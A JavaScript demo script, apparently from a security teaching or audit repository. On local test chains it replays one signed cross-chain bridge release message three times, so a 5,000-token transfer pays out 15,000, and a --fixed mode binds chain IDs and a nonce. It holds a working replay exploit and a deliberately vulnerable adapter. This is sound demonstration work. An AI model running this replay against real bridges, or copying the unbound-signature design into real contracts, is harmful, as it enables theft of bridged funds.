// Attack #3: the message that paid three times. The signed message says who and how much,
// but not which chain it is for or which number it is, and nothing marks it as used.
// We bridge 5,000 once and present the same signed message to chain B twice and chain C once.
//   node demos/03-replay.mjs           paid on B, again on B, and on C: 15,000 for 5,000 sent
//   node demos/03-replay.mjs --fixed   source, destination and nonce are signed; used once
import { keccak256, encodeAbiParameters, parseAbiParameters } from "viem";
import { startChain, stopChains, roles, verifiers, abis, sigsFrom, units, fmt } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "replay-fixed" : "replay", fixed ? "Replay, fixed" : "Replay");
const CHAIN_A = 1001n;
const B = await startChain({ id: 31338, port: 8545, name: "chain B" });
const C = await startChain({ id: 31339, port: 8546, name: "chain C" });

const who = roles.attacker.address;
const setup = async (X) => {
  const token = await X.deploy("token", ["Test rsETH", "tRSETH", 18]);
  // --fixed only picks which adapter is deployed; both use the same 2-of-3 verifiers.
  const adapter = fixed
    ? await X.deploy("replayFixed", [token, CHAIN_A, verifiers.map((v) => v.address), 2n])
    : await X.deploy("replay", [token, verifiers.map((v) => v.address), 2n]);
  await X.send(roles.relayer, token, abis.token, "mint", [adapter, units(50_000)]);
  return { X, token, adapter, abi: fixed ? abis.replayFixed : abis.replay };
};
const onB = await setup(B), onC = await setup(C);

// One real transfer: 5,000 from chain A to chain B, nonce 1. The verifiers sign it once.
const amount = units(5_000), nonce = 1n;
const d = fixed
  ? keccak256(encodeAbiParameters(parseAbiParameters("uint256, uint256, uint256, address, uint256"), [CHAIN_A, B.id, nonce, who, amount]))
  : keccak256(encodeAbiParameters(parseAbiParameters("address, uint256"), [who, amount]));
const sigs = await sigsFrom(verifiers.slice(0, 2), d);
t.say(`sent once on chain A: 5,000 tRSETH → chain B · signed by 2 of 3`);

for (const [i, side] of [[1, onB], [2, onB], [3, onC]]) {
  const args = fixed ? [nonce, who, amount, sigs] : [who, amount, sigs];
  t.cmd(`try ${i} · ${side.X.name}.release(same signed message)`);
  const r = await side.X.attempt(roles.relayer, side.adapter, side.abi, "release", args);
  if (r.ok) t.bad(`  ✓ paid 5,000`); else t.ok(`  ✗ reverted: ${r.name}`);
}
// The verdict comes from balances on both chains, not from the flag.
const got = (await B.balanceOf(onB.token, who)) + (await C.balanceOf(onC.token, who));
t.big(got > amount ? `SENT 5,000 · RECEIVED ${fmt(got)}` : `SENT 5,000 · received ${fmt(got)}`);
t.save(); stopChains(); process.exit(0);
